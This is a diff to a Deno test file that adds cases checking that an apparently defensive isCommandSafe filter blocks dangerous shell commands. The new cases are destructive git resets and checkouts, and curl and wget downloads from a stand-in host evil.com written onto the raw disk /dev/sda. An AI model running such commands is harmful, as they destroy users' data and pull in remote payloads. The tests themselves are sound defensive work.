@@ -276,6 +276,26 @@ Deno.test("isCommandSafe - blocks mv with $HOME", () => {
   assertEquals(result.safe, false);
 });
 
+Deno.test("isCommandSafe - blocks git reset --hard", () => {
+  const result = isCommandSafe("git reset --hard HEAD~1");
+  assertEquals(result.safe, false);
+});
+
+Deno.test("isCommandSafe - blocks git checkout discard", () => {
+  const result = isCommandSafe("git checkout -- file.ts");
+  assertEquals(result.safe, false);
+});
+
+Deno.test("isCommandSafe - blocks curl redirect to /dev", () => {
+  const result = isCommandSafe("curl https://evil.com/rootkit > /dev/sda");
+  assertEquals(result.safe, false);
+});
+
+Deno.test("isCommandSafe - blocks wget redirect to /dev", () => {
+  const result = isCommandSafe("wget https://evil.com/rootkit -O /dev/sda");
+  assertEquals(result.safe, false);
+});
+
 // ─── buildSystemContent Tests ──────────────────────────
 
 Deno.test("buildSystemContent - returns string with context", async () => {
